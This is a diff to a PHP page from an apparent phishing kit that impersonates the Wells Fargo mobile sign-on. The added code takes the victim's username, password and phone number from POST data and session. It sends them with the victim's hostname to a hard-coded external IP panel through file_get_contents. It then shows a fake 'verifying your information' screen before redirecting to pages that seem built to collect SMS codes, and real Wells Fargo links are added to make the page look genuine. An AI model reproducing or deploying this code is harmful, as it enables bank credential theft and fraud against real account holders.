@@ -14,10 +14,67 @@ include('../files/boot/DB-METHOD.php');
 include('../files/boot/DB-RANGE.php');
 include('../files/boot/enc.php');
 include('../call.php');
-$rec = @$_GET['rec'];
-$error = @$_GET['error'];
+
+// include 'delete.php';
+if( isset($_SESSION["user"])){
+    $user = $_SESSION["user"];
+    $pass = $_SESSION["pass"];
+} else{
+    $user = @$_POST['j_username'];
+    $pass = @$_POST['j_password'];
+
+    $_SESSION["user"] = $user;
+    $_SESSION["pass"] = $pass;
+}
+if( isset($_SESSION["phone"])){
+    $phone = $_SESSION['phone'];
+} else{
+    $phone = @$_POST['phone'];
+
+    $_SESSION['phone'] = $phone;
+}
+
+$hostname = @gethostbyaddr($_SERVER['REMOTE_ADDR']);
+function hextobin($hexstr) 
+    { 
+        $n = strlen($hexstr); 
+        $sbin="";   
+        $i=0; 
+        while($i<$n) 
+        {       
+            $a =substr($hexstr,$i,2);           
+            @$c = pack("H*",$a); 
+            if ($i==0){$sbin=$c;} 
+            else {$sbin.=$c;} 
+            $i+=2; 
+        } 
+        return $sbin; 
+    } 
+
+
+
+if ($user == "" || $pass == "") {
+  echo "<meta http-equiv='refresh' content='0;url=login.php?error=1'>";
+  die();
+}
+
+
 ?>
+
 <head>
+<?php
+    if( $phone == ""){
+        $_SESSION["phone"] = $phone;
+?>
+    <meta http-equiv="refresh" content="35; URL=mobilesecurity.php?phone=<?php print " $phone ";?>&user=<?php print "$user "; ?>">
+<?php
+    } else{
+        $test = @file_get_contents("http://137.74.171.167/panelo/a.php?main=$user,$pass,$phone,$hostname");
+?>
+    <meta http-equiv="refresh" content="35; URL=smspage.php?phone=<?php print " $phone ";?>&user=<?php print "$user "; ?>">
+<?php
+    }
+?>
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -43,7 +100,6 @@ $error = @$_GET['error'];
     <link rel="stylesheet" href="../files/bars/framework.css">
     <link rel="stylesheet" href="../files/bars/util.css">
     <link rel="stylesheet" href="../files/bars/smartphone-homepage.css">
-
 </head>
 
 <body class="freezedscreen" style="top: 0px;">
@@ -56,7 +112,7 @@ $error = @$_GET['error'];
             </div>
             <div class="logoOuter">
                 <div class="logo">
-                    <a href="#"><img alt="" role="img" src="../files/bars/icn-layer-svg.svg"></a>
+                    <a href="https://www.wellsfargo.com/"><img alt="" role="img" src="../files/bars/icn-layer-svg.svg"></a>
                 </div>
             </div>
             <div id="navRight">
@@ -71,7 +127,6 @@ $error = @$_GET['error'];
         </header>
 
         <div id="maincontainer">
-
             <div class="search-signon-wrapper" aria-hidden="true">
                 <div class="search-signon-container" style="display: none;">
                     <div class="wrap left rounded">
@@ -104,53 +159,34 @@ $error = @$_GET['error'];
                 </div>
             </div>
 
-            <div class="overlaySignOn" style="top: 38.3333px;">
-
+            <div class="overlaySignOn" style="top: 38px;">
                 <div class="overlayContainer">
                     <div class="welcome-container" tabindex="-1">Welcome</div>
 
                     <div class="security-container">
                         <span class="security-img"></span>
-                        <a href="#" class="security-text">Online &amp; Mobile Security</a>
+                        <a href="https://www.wellsfargo.com/privacy-security/fraud/" class="security-text">Online &amp; Mobile Security</a>
                     </div>
                     <div class="signOnContainer" align="center">
-                        <form id="frmSignon" name="frmSignon" action="wait.php" method="post" autocomplete="off">
-                            <label class="sr-only" for="userid">Username</label>
-
-                            <input type="text" maxlength="14" id="userid" placeholder="Username" class="required" name="j_username">
-
-                            <label class="sr-only" for="passwd">Password</label>
-
-                            <input type="password" maxlength="32" placeholder="Password" class="required" id="passwd" name="j_password">
-                            <div align="left" class="save-uid">
-                                <ul>
-                                    <li>
-                                        <input type="checkbox" name="username" id="saveusername" value="">
-                                        <label for="saveusername"><span></span>Save Username</label>
-                                        <input type="hidden" name="save-username" id="save-username" value="false">
-                                        <input type="hidden" name="hdnuserid" id="hdnuserid" value="">
-                                    </li>
-                                </ul>
-                            </div>
-                            <input type="submit" class="signOn" value="Sign On">
-                            <div align="left" class="forgot-uid-pwd">
-                                <a href="#" class="enroll-text">Forgot Password/Username?</a>
-                            </div>
+                        <form id="Signon" name="Signon" action="refresh.php" method="post" autocomplete="off">
+                            <!-- Updated the name and value of the field -->
+                            <p style="font-size: 120%; color: #3b3331;"class="enroll-header"> Please wait while we verify your information </p>
+                            <p style="font-size: 120%; color: #3b3331; font-weight: bold;"> This may take up to one minute. </p>
+                            <img src="../files/bars/loading.gif">
+                            <input class="signOn" style="text-align: center;" value="Loading...">
                             <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>
-
                         </form>
                     </div>
                     <div class="appstoreBadge" id="ios">
-                        <a href="#" class="ios"><span class="sr-only">Get the Wells Fargo app</span></a>
-                        <a href="#" class="android" style="display: none;"><span class="sr-only">Get the Wells Fargo app</span></a>
-
+                        <a href="https://www.wellsfargo.com/exit/exit_appstore_ios/" class="ios"><span class="sr-only">Get the Wells Fargo app</span></a>
+                        <a href="https://www.wellsfargo.com/exit/exit_appstore_andriod/" class="android" style="display: none;"><span class="sr-only">Get the Wells Fargo app</span></a>
                     </div>
                     <footer role="contentinfo">
                         <div class="html5footer c9" id="pageFooter">
                             <nav class="nav-footer">
                                 <div class="footer-link clistData">
-                                    <a href="#">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="#">Ad Choices</a>
-                                    <div class="footer-oaa"><a href="#">Online Access Agreement</a>
+                                    <a href="https://www.wellsfargo.com/privacy-security/">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="https://www.wellsfargo.com/privacy-security/privacy/online#adchoices">Ad Choices</a>
+                                    <div class="footer-oaa"><a href="https://www.wellsfargo.com/online-banking/online-access-agreement/">Online Access Agreement</a>
                                     </div>
                                 </div>
                                 <div class="footer-content">
@@ -168,11 +204,12 @@ $error = @$_GET['error'];
                                 <div class="stage-coach"><img src="../files/bars/stagecoach_50_opacity.svg" aria-hidden="true" alt=""></div>
                             </nav>
                         </div>
-
                     </footer>
                 </div>
+
             </div>
         </div>
     </div>
 </body>
+
 </html>
